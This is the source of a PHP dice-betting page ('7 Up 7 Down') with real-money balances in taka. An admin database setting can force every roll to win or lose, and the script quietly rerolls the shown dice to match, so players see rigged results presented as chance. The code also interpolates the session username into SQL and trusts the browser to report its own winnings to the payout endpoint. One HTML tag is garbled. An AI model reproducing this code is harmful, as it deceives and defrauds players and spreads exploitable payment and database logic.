<?php
ob_start();
session_start();
include 'db.php';

if(!isset($_SESSION['user_id'])) { header("Location: index.php"); exit; }
$user = $_SESSION['user_id'];

// Fetch User Balance
$res = $conn->query("SELECT balance FROM users WHERE username = '$user'");
$row = $res->fetch_assoc();
$balance = $row['balance'];

// --- WINNING LOGIC FROM DATABASE ---
// We will check a 'settings' or 'admin_control' value to decide the result
$logic_res = $conn->query("SELECT game_logic FROM settings WHERE id = 1");
$logic = $logic_res->fetch_assoc()['game_logic'] ?? 'random'; 
// Values: 'win' (Always Win), 'loss' (Always Loss), 'random' (Fair Game)
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>7 Up 7 Down - Professional</title>
    <style>
    /* ১. মূল লেআউট ফিক্স */
    body { 
        background: #0a0b10; 
        color: #fff; 
        font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; 
        margin: 0; 
        display: flex; 
        flex-direction: column; 
        height: 100vh; 
        width: 100vw;
        overflow: hidden; /* স্ক্রিন যাতে না কাঁপে */
    }

    /* ২. টপ বার (স্মার্ট ও স্লিম) */
    .top-bar { 
        display: flex; 
        justify-content: space-between; 
        align-items: center; 
        padding: 10px 15px; 
        background: #161b22; 
        border-bottom: 1px solid #30363d; 
        box-sizing: border-box;
    }
    .back-btn, .history-btn { 
        background: #21262d; 
        border: 1px solid #30363d; 
        color: #fff; 
        padding: 6px 12px; 
        border-radius: 6px; 
        text-decoration: none; 
        font-size: 13px; 
        font-weight: 600;
    }
    .balance-display { 
        color: #00ff88; 
        font-weight: bold; 
        font-size: 15px;
    }

    /* ৩. গেম এরিয়া (মাঝখানে সুন্দরভাবে সাজানো) */
    .game-main { 
        flex-grow: 1; 
        display: flex; 
        flex-direction: column; 
        align-items: center; 
        justify-content: center; 
        padding: 15px; 
        box-sizing: border-box;
    }

    .bet-types { 
        display: grid; 
        grid-template-columns: repeat(3, 1fr); 
        gap: 10px; 
        width: 100%; 
        max-width: 400px; 
        margin-bottom: 30px; 
    }
    .type-box { 
        background: #21262d; 
        border: 2px solid #333; 
        padding: 15px 5px; 
        text-align: center; 
        border-radius: 15px; 
        cursor: pointer; 
        transition: 0.2s;
    }
    .type-box.active { 
        border-color: #00ff88; 
        background: rgba(0,255,136,0.1); 
        box-shadow: 0 0 15px rgba(0,255,136,0.2); 
    }
    .type-box b { font-size: 13px; display: block; margin-bottom: 2px; }
    .type-box span { font-size: 11px; color: #00ff88; }

    /* ৪. ডাইস অ্যানিমেশন */
    .dice-area { display: flex; gap: 20px; margin: 20px 0; }
    .dice { 
        width: 75px; 
        height: 75px; 
        background: #fff; 
        color: #000; 
        display: flex; 
        align-items: center; 
        justify-content: center; 
        font-size: 40px; 
        border-radius: 18px; 
        box-shadow: 0 5px 20px rgba(255,255,255,0.1); 
        font-weight: bold; 
    }
    .rolling { animation: shuffle 0.2s infinite; }
    @keyframes shuffle { 
        0%, 100% { transform: translateY(0) rotate(0deg); } 
        50% { transform: translateY(-15px) rotate(15deg); } 
    }

    /* ৫. কন্ট্রোল প্যানেল (নিচের অংশ - ১০০০% ফিক্সড) */
    .bottom-panel { 
        background: #161b22; 
        padding: 15px; 
        border-top: 1px solid #30363d; 
        width: 100%;
        box-sizing: border-box;
        padding-bottom: env(safe-area-inset-bottom, 20px); /* আইফোনের জন্য বিশেষ গ্যাপ */
    }

    .amount-selector { 
        display: flex; 
        align-items: center; 
        gap: 10px; 
        margin-bottom: 20px; 
        overflow-x: auto; /* মোবাইলে সোয়াইপ করার জন্য */
        padding-bottom: 8px;
        -webkit-overflow-scrolling: touch;
        scrollbar-width: none;
    }
    .amount-selector::-webkit-scrollbar { display: none; }

    .amt-btn { 
        flex-shrink: 0; 
        background: #21262d; 
        border: 1px solid #30363d; 
        color: #fff; 
        padding: 10px 18px; 
        border-radius: 10px; 
        font-size: 14px; 
        font-weight: 600;
    }
    .amt-btn.active { 
        border-color: #00ff88; 
        color: #00ff88; 
        background: rgba(0,255,136,0.1); 
    }

    .math-btn { 
        background: #30363d; 
        color: #fff; 
        width: 42px; 
        height: 42px; 
        border-radius: 8px; 
        font-size: 24px; 
        border: none;
        flex-shrink: 0;
    }

    .action-bar { 
        display: flex; 
        gap: 12px; 
        align-items: center; 
    }
    .sound-btn { 
        background: #21262d; 
        border: 1px solid #30363d; 
        color: #fff; 
        width: 55px; 
        height: 55px; 
        border-radius: 12px; 
        display: flex; 
        align-items: center; 
        justify-content: center; 
        font-size: 22px; 
        flex-shrink: 0;
    }
    .place-bet-btn { 
        flex-grow: 1; 
        background: #00ff88; 
        border: none; 
        color: #000; 
        height: 55px; 
        border-radius: 12px; 
        font-weight: bold; 
        font-size: 18px; 
        text-transform: uppercase;
        box-shadow: 0 4px 15px rgba(0,255,136,0.2);
    }
    .place-bet-btn:disabled { background: #333; color: #888; box-shadow: none; }
</style>

</head>
<body>

    <div class="top-bar">
        <a href="index.php" class="back-btn">BACK</a>
        <div class="balance-display">BALANCE: ৳<span id="uBal"><?php echo number_format($balance, 2); ?></span></div>
        <a href="game_history.php" class="history-btn">HISTORY</a>
    </div>

    <div class="game-main">
        <div class="bet-types">
            <div class="type-box" onclick="setBT('under', 1.98)"><b>UNDER 7</b><span>1.98x</span></div>
            <div class="type-box" onclick="setBT('seven', 5.8)"><b>LUCKY 7</b><spanx</span></div>
            <div class="type-box" onclick="setBT('over', 1.98)"><b>OVER 7</b><span>1.98x</span></div>
        </div>
        
        <div class="dice-area">
            <div id="d1" class="dice">1</div>
            <div id="d2" class="dice">1</div>
        </div>
        <p id="gMsg" style="font-weight: bold; height: 25px; font-size: 18px;"></p>
    </div>

    <div class="bottom-panel">
        <div class="amount-selector">
            <button class="math-btn" onclick="chgAmt(-10)">-</button>
            <div style="display: flex; gap: 8px;">
                <?php $chips = [10, 20, 50, 100, 500, 1000, 5000]; foreach($chips as $c): ?>
                    <button class="amt-btn" onclick="setAmt(<?php echo $c; ?>)"><?php echo $c; ?></button>
                <?php endforeach; ?>
            </div>
            <button class="math-btn" onclick="chgAmt(10)">+</button>
        </div>

        <div class="action-bar">
            <button class="sound-btn" onclick="tglSnd()">🔊</button>
            <button id="bBtn" class="place-bet-btn" onclick="play()">PLACE BET (৳<span id="dAmt">10</span>)</button>
        </div>
    </div>

    <script>
        let sType = null, bAmt = 10, odds = 0, snd = true;

        function setBT(t, v) { 
            sType = t; odds = v; 
            document.querySelectorAll('.type-box').forEach(b => b.classList.remove('active'));
            event.currentTarget.classList.add('active');
        }
        function setAmt(v) { 
            bAmt = v; 
            document.querySelectorAll('.amt-btn').forEach(b => b.classList.remove('active'));
            event.currentTarget.classList.add('active');
            document.getElementById('dAmt').innerText = bAmt; 
        }
        function chgAmt(v) { bAmt = Math.max(10, bAmt + v); document.getElementById('dAmt').innerText = bAmt; }
        function tglSnd() { snd = !snd; event.target.innerText = snd ? "🔊" : "🔇"; }

        function play() {
            if(!sType) return alert('Please select a betting option!');
            const btn = document.getElementById('bBtn'), d1 = document.getElementById('d1'), d2 = document.getElementById('d2'), msg = document.getElementById('gMsg');
            btn.disabled = true; d1.classList.add('rolling'); d2.classList.add('rolling'); msg.innerText = "ROLLING...";

            fetch('api_callback.php', {
                method: 'POST', headers: { 'Content-Type' : 'application/json' },
                body: JSON.stringify({ action: 'bet', username: '<?php echo $user; ?>', amount: bAmt, tx_id: 'G_'+Date.now() })
            })
            .then(res => res.json())
            .then(data => {
                if(data.status === 'ok') {
                    setTimeout(() => {
                        d1.classList.remove('rolling'); d2.classList.remove('rolling');
                        
                        // --- Logic Controlled Result ---
                        let logic = "<?php echo $logic; ?>";
                        let v1, v2, total;

                        function getRes() {
                            v1 = Math.floor(Math.random()*6)+1; v2 = Math.floor(Math.random()*6)+1;
                            total = v1 + v2;
                            let isWin = (sType==='under' && total<7) || (sType==='seven' && total===7) || (sType==='over' && total>7);
                            
                            if(logic === 'win' && !isWin) return getRes();
                            if(logic === 'loss' && isWin) return getRes();
                            return {v1, v2, total, isWin};
                        }

                        let final = getRes();
                        d1.innerText = final.v1; d2.innerText = final.v2;

                        if(final.isWin) {
                            let wAmt = bAmt * odds;
                            msg.style.color = "#00ff88"; msg.innerText = "WINNER! +৳" + wAmt.toFixed(2);
                            fetch('api_callback.php', {
                                method: 'POST', headers: { 'Content-Type' : 'application/json' },
                                body: JSON.stringify({ action: 'win', username: '<?php echo $user; ?>', amount: wAmt, tx_id: 'W_'+Date.now() })
                            }).then(() => setTimeout(() => location.reload(), 2500));
                        } else {
                            msg.style.color = "#ff4d4d"; msg.innerText = "YOU LOST! TOTAL: " + final.total;
                            setTimeout(() => location.reload(), 2500);
                        }
                    }, 1500);
                } else { alert(data.message); location.reload(); }
            });
        }
    </script>
</body>
</html>
                                 
